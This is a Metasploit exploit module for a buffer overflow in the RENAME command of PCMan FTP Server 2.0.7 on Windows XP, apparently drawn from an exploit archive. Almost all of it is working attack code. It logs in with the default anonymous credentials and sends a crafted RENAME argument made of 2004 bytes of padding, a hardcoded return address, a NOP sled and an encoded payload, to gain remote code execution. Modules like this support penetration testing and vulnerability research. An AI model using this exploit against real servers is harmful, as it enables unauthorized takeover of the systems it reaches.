# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
## Original Exploit Information ##
# Date:  29 Aug 2015
# Exploit Author: Koby
# Tested on: Windows XP SP3
# Link: https://www.exploit-db.com/exploits/38013/
 
## Software Information ##
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
 
## Metasploit Module Information ##
# Date:  16 April 2016
# Exploit Author: Jonathan Smith
# Tested on: Windows XP SP2
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
 include Msf::Exploit::Remote::Ftp
 
 def initialize(info = {})
 
 super(update_info(info,
 
    &#039;Name&#039; => &#039;PCMan RENAME overflow&#039;,
 
    &#039;Description&#039; => &#039;This module exploits a buffer overflow in the RENAME command of PCMAN FTP Server 2.0.7. This requires authentication but anonymous credentials are enabled by default.&#039;,
 
    &#039;Author&#039; => [ &#039;Metasploit module author: Jonathan Smith. Vulnerability originally discovered by Koby on 29 August 2015. Metasploit module developed 16 April 2016.&#039;],
 
    &#039;Version&#039; => &#039;$Revision: 1 $&#039;,
 
    &#039;Platform&#039; => [&#039;win&#039;],
 
    &#039;Targets&#039; => [ [ &#039;Windows XP SP2&#039;, { } ],],
 
    &#039;DefaultTarget&#039; => 0,
 
    &#039;License&#039; => GPL_LICENSE,
 
    &#039;Payload&#039; => {&#039;BadChars&#039; => "\x00\x0a\x0d"},
 
    &#039;DefaultOptions&#039; => {&#039;EXITFUNC&#039; => &#039;process&#039;}
 
 ))
 
 end
 
def exploit
 
 connect_login
 
 exploitcode = "A" * 2004 + "\x65\x82\xA5\x7C" + make_nops(30) + payload.encoded
 
 send_cmd( [&#039;RENAME&#039;, exploitcode] , false )
 
 disconnect
 
 end
 
end

